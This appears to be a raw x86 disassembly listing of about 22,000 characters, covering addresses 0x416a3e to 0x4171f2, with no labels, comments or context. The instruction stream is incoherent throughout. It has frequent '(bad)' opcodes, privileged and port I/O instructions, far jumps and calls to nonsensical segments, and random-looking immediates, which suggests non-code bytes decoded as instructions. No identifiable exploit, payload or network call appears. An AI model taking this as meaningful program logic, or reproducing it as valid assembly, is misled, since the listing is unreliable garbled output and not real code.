  416a3e:	leave  
  416a3f:	fiadd  WORD PTR [ecx+0x27]
  416a42:	lods   al,BYTE PTR ds:[esi]
  416a43:	xchg   BYTE PTR [eax-0xbf8594],ah
  416a49:	in     al,0x2a
  416a4b:	mov    esi,0x21486b88
  416a50:	lahf   
  416a51:	std    
  416a52:	cmp    DWORD PTR [ecx+0x49],edi
  416a55:	lahf   
  416a56:	fwait
  416a57:	mov    esp,0x7cfb7c0b
  416a5c:	xor    eax,0xa917576b
  416a61:	or     eax,0x6766e42f
  416a66:	or     DWORD PTR [ecx+0x7e],eax
  416a69:	mov    dl,0x13
  416a6b:	xchg   esp,esi
  416a6d:	xor    dh,bl
  416a6f:	(bad)  [ebx+0x21470b2a]
  416a75:	sbb    al,0x24
  416a77:	push   edx
  416a78:	dec    edx
  416a79:	mov    bh,BYTE PTR [edx]
  416a7b:	mov    bh,0xc6
  416a7e:	test   BYTE PTR [edi+0x2a],ah
  416a81:	or     cl,BYTE PTR [edi]
  416a83:	sub    eax,0xda8a4195
  416a88:	fwait
  416a89:	popa   
  416a8a:	lea    esp,[ebp+esi*2-0x51]
  416a8e:	aad    0x4f
  416a90:	pop    ds
  416a91:	lahf   
  416a92:	mov    eax,0x259cf730
  416a97:	scas   al,BYTE PTR es:[edi]
  416a98:	adc    ebp,DWORD PTR [ecx-0x174ddce1]
  416a9e:	cld    
  416a9f:	std    
  416aa0:	test   eax,0x63916e5c
  416aa5:	inc    ebx
  416aa6:	cwde   
  416aa7:	call   0xbd687495
  416aac:	inc    ebx
  416aad:	shr    BYTE PTR [ecx],1
  416aaf:	adc    ch,al
  416ab1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ab2:	inc    edi
  416ab3:	xlat   BYTE PTR ds:[ebx]
  416ab4:	add    ebp,esp
  416ab6:	xchg   edi,eax
  416ab7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ab8:	pop    esi
  416ab9:	in     eax,dx
  416aba:	ret    
  416abb:	or     eax,0xc84af2fc
  416ac0:	push   0xb7cc6f0a
  416ac5:	jecxz  0x416b19
  416ac7:	retf   0x28fe
  416aca:	inc    eax
  416acb:	fbstp  TBYTE PTR [ebx-0x3c]
  416ace:	leave  
  416acf:	fs call 0x2799:0x4a8a2ef4
  416ad7:	loop   0x416a70
  416ad9:	sbb    al,0xf4
  416adb:	jbe    0x416afb
  416add:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ade:	cs ja  0x416a85
  416ae1:	outs   dx,DWORD PTR ds:[esi]
  416ae2:	hlt    
  416ae3:	adc    eax,DWORD PTR [edi+eax*4]
  416ae6:	rol    eax,cl
  416ae8:	mov    WORD PTR [edi],ss
  416aea:	xor    eax,DWORD PTR [ebp-0x1ceef2b3]
  416af0:	inc    ebp
  416af1:	dec    ebp
  416af2:	push   ebp
  416af3:	aaa    
  416af4:	sbb    al,BYTE PTR [edi-0x364f35f6]
  416afa:	mov    WORD PTR [ebx+0x18],ds
  416afd:	les    ecx,FWORD PTR [ebx]
  416aff:	popf   
  416b00:	repnz mov esp,0x2d7c4d96
  416b06:	scas   eax,DWORD PTR es:[edi]
  416b07:	adc    ebp,edi
  416b09:	mov    edi,0x13a64835
  416b0e:	(bad)  
  416b0f:	in     eax,dx
  416b10:	bound  eax,QWORD PTR [esi+0x7f19ee51]
  416b16:	ins    BYTE PTR es:[edi],dx
  416b17:	sub    BYTE PTR ds:0x8b43949f,cl
  416b1d:	push   0x8f5bb97b
  416b22:	lahf   
  416b23:	push   esi
  416b24:	das    
  416b25:	jmp    0x353:0x1e73e9e1
  416b2c:	pop    edx
  416b2d:	xchg   esi,eax
  416b2e:	retf   0x36cd
  416b31:	and    DWORD PTR [ebp+ebp*8-0x2c],ecx
  416b35:	neg    DWORD PTR fs:[edi+0x22cb009c]
  416b3c:	mov    dl,0x95
  416b3e:	push   0x3ebbb342
  416b43:	(bad)  
  416b45:	std    
  416b46:	gs xor eax,0xb3eb2d83
  416b4c:	push   cs
  416b4d:	fidivr WORD PTR [esi-0x92bc1fd]
  416b53:	cs and ecx,esp
  416b56:	out    dx,eax
  416b57:	jle    0x416b7f
  416b59:	retf   0x822e
  416b5c:	adc    ecx,DWORD PTR [eax]
  416b5e:	jle    0x416afe
  416b60:	arpl   bx,bp
  416b62:	mov    ch,0xda
  416b64:	jecxz  0x416b1e
  416b66:	xchg   ch,al
  416b68:	and    DWORD PTR [ebx-0x5264cd51],edx
  416b6e:	clc    
  416b6f:	call   0x9a9c:0xde334e28
  416b76:	imul   ecx,DWORD PTR [edi-0x101b9f33],0x33b972c2
  416b80:	sbb    BYTE PTR [edx],ah
  416b82:	aam    0xbc
  416b84:	ins    BYTE PTR es:[edi],dx
  416b85:	mov    ds:0xd2f02550,eax
  416b8a:	mov    dl,0xb6
  416b8c:	add    DWORD PTR [ebp+0x23],0x825736a9
  416b93:	adc    al,0x1d
  416b95:	cmp    DWORD PTR [eax],ebx
  416b97:	pop    esi
  416b98:	or     al,0x4d
  416b9a:	sub    al,0x58
  416b9c:	imul   esp,ebp,0x5992dbd4
  416ba2:	xor    ah,BYTE PTR [eax]
  416ba4:	push   ebx
  416ba5:	neg    DWORD PTR [edx]
  416ba7:	(bad)  
  416ba9:	dec    edi
  416baa:	xor    eax,0x6b1ba79c
  416baf:	and    ebx,DWORD PTR [edx+0x2f]
  416bb2:	outs   dx,BYTE PTR ds:[esi]
  416bb3:	(bad)  
  416bb4:	out    dx,eax
  416bb5:	mov    dh,0xe0
  416bb7:	or     al,0x8e
  416bb9:	leave  
  416bba:	(bad)  
  416bbb:	sti    
  416bbc:	or     BYTE PTR ds:0xa14e2d79,bl
  416bc2:	loop   0x416ba1
  416bc4:	iret   
  416bc5:	mov    cl,0x50
  416bc7:	mov    al,0x9
  416bc9:	js     0x416c0d
  416bcb:	mov    al,0x2b
  416bcd:	ret    
  416bce:	sar    DWORD PTR [ebx-0x33485648],1
  416bd4:	outs   dx,BYTE PTR ds:[esi]
  416bd5:	push   DWORD PTR [edx+0x5e918824]
  416bdb:	jge    0x416c55
  416bdd:	pop    edx
  416bde:	xchg   esp,eax
  416bdf:	loope  0x416bcb
  416be1:	xor    edi,DWORD PTR [edx-0x78c0d9bc]
  416be7:	in     al,0x29
  416be9:	xor    bl,BYTE PTR [ebp+0x232997b4]
  416bef:	cs je  0x416bd9
  416bf2:	cld    
  416bf3:	xchg   esi,eax
  416bf4:	inc    edi
  416bf5:	icebp  
  416bf6:	push   0x53287029
  416bfb:	loopne 0x416c1c
  416bfd:	add    al,0xd6
  416bff:	or     eax,0x7107d71a
  416c04:	(bad)  
  416c06:	xor    BYTE PTR [esi-0x14],al
  416c09:	push   ecx
  416c0a:	fdivr  QWORD PTR [ebp-0x2ef2c7b1]
  416c10:	dec    esp
  416c11:	sub    eax,0x68a6afd0
  416c16:	xchg   ebx,eax
  416c17:	bound  edx,QWORD PTR [edx-0x74]
  416c1a:	xor    eax,0xfbdddde9
  416c1f:	xchg   esp,eax
  416c20:	jno    0x416c05
  416c22:	shl    DWORD PTR [eax-0x2d01e935],0x84
  416c29:	aaa    
  416c2a:	(bad)  
  416c2b:	jle    0x416c13
  416c2d:	ss fst DWORD PTR fs:[eax+0xb]
  416c32:	lods   al,BYTE PTR ds:[esi]
  416c33:	js     0x416bc5
  416c35:	push   ds
  416c36:	icebp  
  416c37:	add    ecx,ecx
  416c39:	mov    ds:0x5c67c7f6,al
  416c3e:	inc    esi
  416c3f:	lds    edx,FWORD PTR gs:[edi+0x7d]
  416c43:	add    esp,DWORD PTR [ebp-0xb]
  416c46:	imul   esi,DWORD PTR [eax],0x573d3d3e
  416c4c:	in     al,0xf0
  416c4e:	das    
  416c4f:	and    DWORD PTR [edi],esp
  416c51:	dec    esi
  416c52:	xchg   BYTE PTR [esi+eiz*1+0x18d23eb2],dh
  416c59:	xor    BYTE PTR [eax-0x29f7a586],0xba
  416c60:	xchg   esp,eax
  416c61:	dec    esi
  416c62:	sub    BYTE PTR [ebp+eiz*1-0x3a],cl
  416c66:	cmp    al,0x4
  416c68:	adc    DWORD PTR [ecx],esp
  416c6a:	xlat   BYTE PTR ds:[ebx]
  416c6b:	sbb    BYTE PTR [eax],dh
  416c6d:	pop    eax
  416c6e:	fild   DWORD PTR [esi-0x6a014498]
  416c74:	xchg   ebx,eax
  416c75:	je     0x416c21
  416c77:	jle    0x416c48
  416c79:	scas   eax,DWORD PTR es:[edi]
  416c7a:	push   cs
  416c7b:	out    dx,eax
  416c7c:	jle    0x416c73
  416c7e:	add    ch,dl
  416c80:	imul   ecx,edx,0x9fd5f50b
  416c86:	popa   
  416c87:	inc    ebp
  416c88:	pop    esi
  416c89:	das    
  416c8a:	adc    eax,DWORD PTR [eax]
  416c8c:	dec    eax
  416c8d:	je     0x416c27
  416c8f:	enter  0xb01f,0x87
  416c93:	jb     0x416c9a
  416c95:	and    al,0x7
  416c98:	mov    cl,ah
  416c9a:	adc    al,0xf5
  416c9c:	das    
  416c9d:	stos   DWORD PTR es:[edi],eax
  416c9e:	dec    esp
  416c9f:	xchg   edx,eax
  416ca0:	shr    DWORD PTR [esi],1
  416ca2:	inc    edx
  416ca3:	xchg   ecx,eax
  416ca4:	mov    cl,0x32
  416ca6:	inc    edx
  416ca7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ca8:	sub    al,0xdb
  416caa:	add    dl,BYTE PTR [edi+0x7a7e97c9]
  416cb0:	push   esp
  416cb1:	and    al,0xc1
  416cb3:	inc    edi
  416cb4:	dec    esi
  416cb5:	stos   BYTE PTR es:[edi],al
  416cb6:	cmp    ah,BYTE PTR [edi-0x51aeb2e]
  416cbc:	pop    edx
  416cbd:	or     esi,ecx
  416cbf:	ret    0x9e6f
  416cc2:	jle    0x416c7e
  416cc4:	and    al,0x14
  416cc6:	aad    0x68
  416cc8:	dec    eax
  416cc9:	mov    dh,0x74
  416ccb:	push   es
  416ccc:	or     al,0x28
  416cce:	or     DWORD PTR es:[edi-0x41],eax
  416cd2:	mov    eax,ds:0x54419e8a
  416cd7:	mov    ebx,0x4919595
  416cdc:	pop    eax
  416cdd:	addr16 pushf 
  416cdf:	fcomp  DWORD PTR [edx+edx*4]
  416ce2:	or     al,dl
  416ce4:	mov    bl,0x9
  416ce6:	lahf   
  416ce7:	sbb    DWORD PTR [ebx],ebp
  416ce9:	popf   
  416cea:	sub    edi,DWORD PTR [ebp+0x70c235ee]
  416cf0:	retf   
  416cf1:	mov    BYTE PTR [ebp+0x9],bl
  416cf4:	shr    DWORD PTR [ebp-0x2e],1
  416cf7:	or     eax,0x78abb514
  416cfc:	mov    bl,0xbb
  416cfe:	and    DWORD PTR [ebx+0x529bc353],edx
  416d04:	cmp    ecx,esp
  416d06:	mov    DWORD PTR [edi+0xd812935],ebp
  416d0c:	sub    BYTE PTR [edi+0x5],0x90
  416d10:	mul    DWORD PTR [edx-0x44]
  416d13:	jns    0x416d0d
  416d15:	and    DWORD PTR [edx],edx
  416d17:	sbb    DWORD PTR [eax+esi*2-0x4d],0x58
  416d1c:	push   esi
  416d1d:	shl    BYTE PTR [ecx],0x9a
  416d20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d21:	jecxz  0x416cee
  416d23:	inc    eax
  416d24:	mov    cl,BYTE PTR [edi+0x11]
  416d27:	adc    ecx,DWORD PTR [ecx-0x4b204a53]
  416d2d:	push   ebx
  416d2e:	outs   dx,BYTE PTR ds:[esi]
  416d2f:	sahf   
  416d30:	sub    bl,BYTE PTR [esi-0x5b75f3a7]
  416d36:	not    DWORD PTR [eax+0x370e7957]
  416d3c:	out    dx,eax
  416d3d:	scas   al,BYTE PTR es:[edi]
  416d3e:	outs   dx,BYTE PTR ds:[esi]
  416d3f:	jmp    0x416d94
  416d41:	popa   
  416d42:	xor    DWORD PTR [ebx],ebp
  416d44:	mov    edi,DWORD PTR [edx-0x31b9c4af]
  416d4a:	jecxz  0x416d6f
  416d4c:	sbb    esp,eax
  416d4e:	popf   
  416d4f:	jecxz  0x416d2a
  416d51:	add    DWORD PTR [edi+ecx*2-0x7b795c38],ecx
  416d58:	iret   
  416d59:	shl    BYTE PTR [edi+0x41],1
  416d5c:	stos   BYTE PTR es:[edi],al
  416d5d:	lds    esi,FWORD PTR [edx-0x75b6c4e7]
  416d63:	cmp    al,0x92
  416d65:	popa   
  416d66:	mov    ds:0xa102cda7,eax
  416d6b:	jmp    0x416da0
  416d6d:	mov    ds:0xd0b855ad,eax
  416d72:	xchg   ebp,eax
  416d73:	pop    DWORD PTR [eax-0x1fddf539]
  416d79:	and    eax,0xfe149425
  416d7e:	mov    bl,BYTE PTR [eax+0x5b]
  416d81:	ins    BYTE PTR es:[edi],dx
  416d82:	lahf   
  416d83:	xchg   DWORD PTR [ecx+esi*2+0x4b],ebx
  416d87:	mov    ds:0xdb24efd4,al
  416d8c:	inc    ebx
  416d8d:	or     bh,BYTE PTR [ebp+0x46]
  416d90:	and    BYTE PTR [edx-0x1788a073],bl
  416d96:	or     al,0x8e
  416d98:	mov    edi,0xd118d5ed
  416d9d:	push   esp
  416d9e:	cmp    eax,0x53705229
  416da3:	shl    bh,cl
  416da5:	sbb    eax,0xdcbf90a7
  416daa:	mov    ebp,0xff90b1d0
  416daf:	idiv   esp
  416db1:	iret   
  416db2:	or     BYTE PTR ds:0x608539d5,bl
  416db8:	add    bh,BYTE PTR [ecx-0x3a]
  416dbb:	mov    edx,0x466d1908
  416dc0:	jb     0x416d4f
  416dc2:	push   ss
  416dc3:	mov    esp,DWORD PTR [ecx+ecx*2]
  416dc6:	or     BYTE PTR [ebx+edx*1+0x73c87971],bh
  416dcd:	aam    0x6b
  416dcf:	cmp    BYTE PTR [esi+0x72],dl
  416dd2:	mov    al,ds:0x1ab56db
  416dd7:	inc    edi
  416dd8:	mov    ds:0xe0169233,al
  416ddd:	or     al,0xe7
  416ddf:	sub    eax,0x110fe91
  416de4:	push   ss
  416de5:	adc    ah,BYTE PTR ds:0x68db8ff3
  416deb:	mov    esp,0x6242a0d
  416df0:	mov    ds:0xb91fe270,eax
  416df5:	jns    0x416e59
  416df7:	push   es
  416df8:	xchg   ecx,edx
  416dfa:	mov    edx,0xe08a3b1
  416dff:	mov    WORD PTR [ebx],?
  416e01:	xor    ebp,DWORD PTR [ebx+eax*2]
  416e04:	dec    edi
  416e05:	adc    eax,0xe67b2676
  416e0a:	(bad)  
  416e0b:	imul   ebp,DWORD PTR [esi-0x40],0x587b001b
  416e12:	and    edi,edi
  416e14:	ja     0x416dcf
  416e16:	lods   eax,DWORD PTR ds:[esi]
  416e17:	pop    esp
  416e18:	imul   edi,DWORD PTR ds:0x9b798afe,0xefcb4b93
  416e22:	jmp    0x416e5a
  416e24:	rcl    DWORD PTR [ecx],0xd1
  416e27:	jb     0x416dcd
  416e29:	loope  0x416e6c
  416e2b:	leave  
  416e2c:	sub    BYTE PTR [esi+0x26],ah
  416e2f:	mov    bl,0xba
  416e31:	mov    ch,0x7e
  416e33:	jmp    0x416e22
  416e35:	mov    esi,0x6427e589
  416e3a:	(bad)  
  416e3b:	or     al,0xa8
  416e3d:	dec    eax
  416e3e:	in     al,0x6b
  416e40:	jle    0x416e0f
  416e42:	repnz xor BYTE PTR [ebp-0x23e833e2],al
  416e49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e4a:	push   edx
  416e4b:	xor    al,0xa5
  416e4d:	les    esp,FWORD PTR [eax]
  416e4f:	mov    esi,0x6e5d811f
  416e54:	push   0xffffff82
  416e56:	and    eax,0xd3052b25
  416e5b:	and    bh,BYTE PTR [esi+0x75eec681]
  416e61:	call   0xea56b12e
  416e66:	dec    ecx
  416e67:	shr    dl,1
  416e69:	pop    edi
  416e6a:	es cmc 
  416e6c:	jp     0x416edf
  416e6e:	test   al,0x6a
  416e70:	retf   0xfa42
  416e73:	neg    BYTE PTR [ebp-0x3fdb8428]
  416e79:	pop    eax
  416e7a:	int3   
  416e7b:	jmp    0xfe6e:0xb0b3dfd1
  416e82:	push   0xffffffb0
  416e84:	cmp    eax,0x14a2ce57
  416e89:	xchg   ecx,eax
  416e8a:	into   
  416e8b:	mov    edx,0x55e78f10
  416e90:	add    BYTE PTR [bx+si],bl
  416e93:	inc    esi
  416e94:	ret    0x853e
  416e97:	cs popf 
  416e99:	push   edi
  416e9a:	in     al,0xe3
  416e9c:	stos   BYTE PTR es:[edi],al
  416e9d:	or     eax,0xcaa2efde
  416ea2:	ins    DWORD PTR es:[edi],dx
  416ea3:	lock mov ch,0xee
  416ea6:	fisttp QWORD PTR [ecx]
  416ea8:	aad    0x66
  416eaa:	neg    BYTE PTR [edi]
  416eac:	inc    eax
  416ead:	(bad)  
  416eae:	jb     0x416f0c
  416eb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416eb1:	inc    edx
  416eb2:	adc    dl,BYTE PTR [edi-0x70]
  416eb5:	adc    BYTE PTR [edx+0x27],0x7f
  416eb9:	mov    edx,0xdc857b5a
  416ebe:	add    DWORD PTR [ebx-0x695d7da7],edx
  416ec4:	test   al,0xd1
  416ec6:	and    bh,cl
  416ec8:	xor    BYTE PTR [eax+0x37],bh
  416ecb:	(bad)
  416ece:	mov    DWORD PTR [esp+esi*8-0x15],0x8b888049
  416ed6:	ret    0x48ca
  416ed9:	(bad)  
  416eda:	shl    BYTE PTR [ebx-0x18],0x2d
  416ede:	cmp    eax,0x61d6a937
  416ee3:	xor    dh,BYTE PTR [ecx+0x5a]
  416ee6:	(bad)  
  416ee8:	scas   eax,DWORD PTR es:[edi]
  416ee9:	xchg   ebx,eax
  416eea:	ficomp WORD PTR [ebx+0x52]
  416eed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416eee:	jp     0x416ef1
  416ef0:	xchg   BYTE PTR [ecx-0x4484e309],dh
  416ef6:	cdq    
  416ef7:	shr    DWORD PTR [ebx+0x41],0xe0
  416efb:	sbb    BYTE PTR [edi],ah
  416efd:	xor    ebx,DWORD PTR [ecx]
  416eff:	push   eax
  416f00:	pop    ebx
  416f01:	test   al,0xeb
  416f03:	and    al,0x4
  416f05:	popa   
  416f06:	push   ds
  416f07:	shl    BYTE PTR [esi],1
  416f09:	test   DWORD PTR [esp+edi*4],edx
  416f0c:	mov    esi,0xdfc10f0
  416f11:	xchg   esp,eax
  416f12:	adc    dl,BYTE PTR [ebx-0x63]
  416f15:	jns    0x416ec1
  416f17:	add    ch,BYTE PTR gs:[eax+edx*2+0x53ab549b]
  416f1f:	xchg   ecx,eax
  416f20:	ficom  DWORD PTR [ecx]
  416f22:	into   
  416f23:	jbe    0x416f7a
  416f25:	daa    
  416f26:	rcl    BYTE PTR [ebx-0x7699b6cb],0x28
  416f2d:	xor    DWORD PTR [eax+0x33],esi
  416f30:	inc    ebp
  416f31:	in     eax,dx
  416f32:	cs cmc 
  416f34:	pop    eax
  416f35:	add    ebx,esi
  416f37:	mov    al,ds:0xa3d86f6d
  416f3c:	fbstp  TBYTE PTR [eax-0x283d925e]
  416f42:	bound  edi,QWORD PTR [edx-0x7b]
  416f45:	dec    ecx
  416f46:	mov    dl,0xbc
  416f48:	jae    0x416fb2
  416f4a:	outs   dx,BYTE PTR ds:[esi]
  416f4b:	add    BYTE PTR [edx-0x53],0xf5
  416f4f:	pop    ebp
  416f50:	push   ds
  416f51:	jnp    0x416f41
  416f53:	dec    esi
  416f54:	ret    
  416f55:	sub    esi,DWORD PTR [ebx]
  416f57:	not    cl
  416f59:	mov    ecx,0x7dc34d1f
  416f5f:	out    dx,eax
  416f60:	push   edi
  416f61:	mov    bh,0x48
  416f63:	or     ah,BYTE PTR [ebx+0x78]
  416f66:	mov    edx,0x3ddcfb9b
  416f6b:	imul   edx,DWORD PTR [ebx-0x68],0xe17f8eca
  416f72:	add    al,0xfb
  416f74:	inc    edx
  416f75:	or     dl,ch
  416f77:	jo     0x416f76
  416f79:	cs jnp 0x416fe7
  416f7c:	outs   dx,BYTE PTR ds:[esi]
  416f7d:	in     al,0x5b
  416f7f:	add    ah,BYTE PTR [esi+0x61]
  416f82:	loop   0x416fde
  416f84:	(bad)
  416f89:	lds    edi,FWORD PTR [edi-0xea54510]
  416f8f:	shl    DWORD PTR [ebp+ebx*4-0x7a],cl
  416f93:	jno    0x416f2a
  416f95:	sbb    al,BYTE PTR [edi]
  416f97:	(bad)  
  416f98:	xor    ch,BYTE PTR [eax]
  416f9a:	fwait
  416f9b:	dec    ecx
  416f9c:	retf   0x622f
  416f9f:	mov    es,edi
  416fa1:	neg    DWORD PTR [edx]
  416fa3:	dec    ebx
  416fa4:	sti    
  416fa5:	pop    esp
  416fa6:	addr16 push ebp
  416fa8:	cmp    BYTE PTR [ebx+0x2a],ah
  416fab:	and    al,BYTE PTR [edi-0x28da2221]
  416fb1:	xchg   ecx,eax
  416fb2:	ja     0x417006
  416fb4:	loopne 0x416f78
  416fb6:	loope  0x417023
  416fb8:	adc    eax,0xba72f0ce
  416fbd:	test   eax,0x1ba91f43
  416fc2:	shr    DWORD PTR [ebx+0x15],cl
  416fc5:	test   eax,0xa6bfc2d5
  416fca:	stos   BYTE PTR es:[edi],al
  416fcb:	sahf   
  416fcc:	ret    
  416fcd:	sahf   
  416fce:	pop    eax
  416fcf:	dec    edi
  416fd0:	add    edi,DWORD PTR [esi]
  416fd2:	repz mov bl,0x55
  416fd6:	add    ebp,ebp
  416fd8:	inc    esp
  416fd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416fda:	dec    edi
  416fdb:	inc    esi
  416fdc:	out    0x4e,al
  416fde:	jmp    FWORD PTR [esi+0x21df00f6]
  416fe4:	inc    esi
  416fe5:	imul   ecx,ebp,0xffffffa9
  416fe8:	(bad)  
  416fe9:	jge    0x417030
  416feb:	add    BYTE PTR [esi+0x1b],al
  416fee:	cld    
  416fef:	add    BYTE PTR [eax-0x5b],dl
  416ff2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ff3:	dec    edx
  416ff4:	sub    esi,DWORD PTR [ecx]
  416ff6:	div    BYTE PTR [eax-0x1d]
  416ff9:	xlat   BYTE PTR ds:[ebx]
  416ffa:	push   0x5272981c
  416fff:	push   edx
  417000:	adc    al,0x16
  417002:	push   ecx
  417003:	int    0xe4
  417005:	mov    cl,0x84
  417007:	cmc    
  417008:	out    dx,eax
  417009:	add    al,0x5b
  41700b:	cmp    eax,0xae7e3336
  417010:	retf   
  417011:	test   eax,0x727f7880
  417016:	nop
  417017:	or     DWORD PTR [ecx-0x549f9070],esp
  41701d:	inc    esp
  41701e:	inc    ebp
  41701f:	xchg   edx,eax
  417020:	pop    ebx
  417021:	or     DWORD PTR [ecx-0x2bad9e98],edx
  417027:	push   0xfffffff7
  417029:	mov    eax,0xe525ac2e
  41702e:	sbb    eax,0x1e4ef744
  417033:	sbb    esi,DWORD PTR [ebx]
  417035:	sbb    ebp,DWORD PTR [ebx+0x5fea1ac8]
  41703b:	leave  
  41703c:	jmp    0x417017
  41703e:	fidivr DWORD PTR [edi+0x2522fd03]
  417044:	mov    ebp,0x96291f83
  417049:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41704a:	xchg   edi,eax
  41704b:	cmp    eax,DWORD PTR [edx]
  41704d:	cmp    eax,0x445c1589
  417052:	retf   
  417053:	pusha  
  417054:	mov    bl,0x6f
  417056:	xor    al,0xb3
  417058:	dec    ebp
  417059:	in     eax,0xb5
  41705b:	mov    esi,0x3462fe49
  417060:	ror    DWORD PTR [ebp-0x438585da],0x3e
  417067:	out    0x79,eax
  417069:	push   ss
  41706a:	outs   dx,BYTE PTR ds:[esi]
  41706b:	pop    edx
  41706c:	and    eax,0xaeac0227
  417071:	ins    BYTE PTR es:[edi],dx
  417072:	push   esp
  417073:	iret   
  417074:	mov    ds:0x231fe42c,eax
  417079:	sbb    dl,BYTE PTR [edx-0x40]
  41707c:	fldenv [ebx-0x43]
  41707f:	pushf  
  417080:	jl     0x41704e
  417082:	pop    esp
  417083:	mov    edi,0x72a58511
  417088:	pop    ecx
  417089:	rol    DWORD PTR [edi],cl
  41708b:	sbb    esp,ecx
  41708d:	jp     0x4170ea
  41708f:	mov    edi,0x1083dd12
  417094:	or     ebp,DWORD PTR [edx]
  417096:	xor    ch,ch
  417098:	(bad)  
  417099:	sub    esi,ebp
  41709b:	or     al,al
  41709d:	mov    edi,0x9550fae1
  4170a2:	jbe    0x41703c
  4170a4:	xchg   edi,eax
  4170a5:	aad    0xfe
  4170a7:	cmp    BYTE PTR [esi],0x84
  4170aa:	mov    esi,0xec5364f7
  4170af:	ins    BYTE PTR es:[edi],dx
  4170b0:	sbb    DWORD PTR [eax+0x24d6b095],0x876e6d16
  4170ba:	push   ss
  4170bb:	pop    ebp
  4170bc:	fldcw  WORD PTR [esi+0x27d29137]
  4170c2:	out    dx,eax
  4170c3:	inc    ebp
  4170c4:	mov    ds:0x3cca7f5f,al
  4170c9:	test   DWORD PTR [ebp+0x4d],0x511193df
  4170d0:	fidivr DWORD PTR [edx-0x3e]
  4170d3:	jnp    0x4170ce
  4170d5:	xor    DWORD PTR [edi],edi
  4170d7:	scas   eax,DWORD PTR es:[edi]
  4170d8:	stc    
  4170d9:	sbb    al,BYTE PTR [esi+0x5b]
  4170dc:	inc    ebp
  4170dd:	stos   DWORD PTR es:[edi],eax
  4170de:	stos   DWORD PTR es:[edi],eax
  4170df:	xor    BYTE PTR [ecx],dh
  4170e1:	push   ds
  4170e2:	xor    BYTE PTR [edi-0x6],ch
  4170e5:	iret   
  4170e6:	push   ecx
  4170e7:	outs   dx,DWORD PTR ds:[esi]
  4170e8:	mov    bl,0x45
  4170ea:	adc    DWORD PTR [ebx+0x35070027],ebx
  4170f0:	xor    eax,0xf51b0637
  4170f5:	push   esp
  4170f6:	cmp    eax,0x39fcbe54
  4170fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170fc:	cmp    edx,eax
  4170fe:	std    
  4170ff:	push   ebx
  417100:	and    eax,0xab4922c0
  417105:	push   edx
  417106:	inc    BYTE PTR [ebx]
  417108:	outs   dx,BYTE PTR ds:[esi]
  417109:	inc    edi
  41710a:	cmp    ah,BYTE PTR [ebx]
  41710c:	push   ds
  41710d:	or     eax,ebp
  41710f:	iret   
  417110:	mov    esp,0x631fb746
  417115:	ins    BYTE PTR es:[edi],dx
  417116:	stc    
  417117:	dec    ecx
  417118:	jbe    0x4170ae
  41711a:	sub    DWORD PTR [ebp-0x4f],esp
  41711d:	mov    dh,0x1e
  41711f:	hlt    
  417120:	fdivr  DWORD PTR [ebx+0x7567c986]
  417126:	xchg   esp,eax
  417127:	or     eax,0x4ce413e8
  41712c:	dec    edx
  41712d:	sbb    ebx,DWORD PTR [esp+eax*2-0x42e060c8]
  417134:	(bad)  
  417135:	sub    eax,0xe1c2d2f4
  41713a:	push   edx
  41713b:	(bad)  
  41713c:	xchg   ecx,eax
  41713d:	mov    eax,ds:0xb7409861
  417142:	lahf   
  417143:	jle    0x417118
  417145:	in     al,0x83
  417147:	out    dx,eax
  417148:	xor    BYTE PTR [esi-0x7b4c2f58],0xc
  41714f:	dec    ecx
  417150:	jno    0x417151
  417152:	sbb    dl,bl
  417154:	mov    bh,0x93
  417156:	loop   0x4170e0
  417158:	jmp    0xa791:0x3bc90fb
  41715f:	(bad)  
  417160:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417161:	push   ds
  417162:	test   al,0xd1
  417164:	fild   WORD PTR [edx-0x57046f3f]
  41716a:	aas    
  41716b:	dec    esi
  41716c:	lea    ebx,[ebx+0x5f3b3844]
  417172:	or     al,0xcc
  417174:	lods   eax,DWORD PTR ds:[esi]
  417175:	shl    BYTE PTR [eax-0x650b0a42],cl
  41717b:	scas   al,BYTE PTR es:[edi]
  41717c:	inc    esp
  41717d:	fimul  WORD PTR [ecx]
  41717f:	inc    ebp
  417180:	add    BYTE PTR [eax-0x20],ch
  417183:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417184:	add    esi,DWORD PTR [ecx+edi*8+0x45020428]
  41718b:	xchg   BYTE PTR [ecx+0x7785ffc3],al
  417191:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417192:	mov    esp,0x31ea49fa
  417197:	xchg   esp,eax
  417198:	add    BYTE PTR [edi+0x30b3575d],al
  41719e:	hlt    
  41719f:	scas   al,BYTE PTR es:[edi]
  4171a0:	aaa    
  4171a1:	aam    0x17
  4171a3:	js     0x417202
  4171a5:	dec    ebx
  4171a6:	push   ecx
  4171a7:	in     al,0x71
  4171a9:	jge    0x41712c
  4171ab:	sub    DWORD PTR [edx],ebx
  4171ad:	mov    ch,0xda
  4171b0:	int    0x0
  4171b2:	call   0x4a7c0ca2
  4171b7:	pop    es
  4171b8:	add    BYTE PTR [edx-0x6a],bl
  4171bb:	sbb    ebp,DWORD PTR [edi-0x35]
  4171be:	mov    ebx,0xb1fc09d2
  4171c3:	add    bh,BYTE PTR [ebp+esi*8-0xc]
  4171c7:	aaa    
  4171c8:	daa    
  4171c9:	add    edi,DWORD PTR ds:[ecx+0x493faebb]
  4171d0:	pushf  
  4171d1:	cli    
  4171d2:	andnps xmm7,XMMWORD PTR [edx]
  4171d5:	or     ah,0x36
  4171d8:	in     eax,0x89
  4171da:	jg     0x4171e8
  4171dc:	add    DWORD PTR [edi-0x35ec54a8],ebp
  4171e2:	sahf   
  4171e3:	jmp    0xf2b56ac9
  4171e8:	ret    0x5545
  4171eb:	aaa    
  4171ec:	or     al,0x7f
  4171ee:	inc    ebx
  4171ef:	fsubr  QWORD PTR [ecx-0x33]
  4171f2:	mov    DWORD PTR [ebx],ebp
